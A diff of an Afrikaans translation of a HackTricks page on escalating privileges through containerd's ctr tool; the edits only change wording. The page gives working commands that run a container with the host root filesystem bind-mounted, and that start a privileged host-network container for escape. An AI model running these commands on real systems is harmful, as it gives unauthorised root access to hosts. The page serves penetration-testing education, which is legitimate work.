@@ -1,10 +1,10 @@
-# Containerd (ctr) Eskalasie van voorregte
+# Containerd (ctr) Privilege Escalation
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Basiese inligting
 
-Gaan na die volgende skakel om te leer **waar `containerd` en `ctr` in die kontainer-stapel pas**:
+Gaan na die volgende skakel om te leer **waar `containerd` en `ctr` in die container-stapel pas**:
 
 
 {{#ref}}
@@ -13,7 +13,7 @@ container-security/runtimes-and-engines.md
 
 ## PE 1
 
-as jy vind dat 'n gasheer die `ctr`-opdrag bevat:
+as jy vind dat 'n host die `ctr` command bevat:
 ```bash
 which ctr
 /usr/bin/ctr
@@ -25,18 +25,18 @@ REF                                  TYPE                                       
 registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
 registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
 ```
-En dan **run een van daardie images en mount die host root folder daarop**:
+En dan **voer een van daardie images uit wat die host root-gids daarop mount**:
 ```bash
 ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
 ```
 ## PE 2
 
-Draai 'n privileged container en ontsnap daaruit.\
-Jy kan 'n privileged container soos volg draai:
+Voer 'n privileged container uit en escape daaruit.\
+Jy kan 'n privileged container soos volg uitvoer:
 ```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
 ```
-Dan kan jy sommige van die tegnieke wat op die volgende bladsy genoem word, gebruik om **daaruit te ontsnap deur bevoorregte capabilities te misbruik**:
+Dan kan jy sommige van die tegnieke wat op die volgende bladsy genoem word gebruik om **daaruit te ontsnap deur bevoorregte capabilities te misbruik**:
 
 
 {{#ref}}
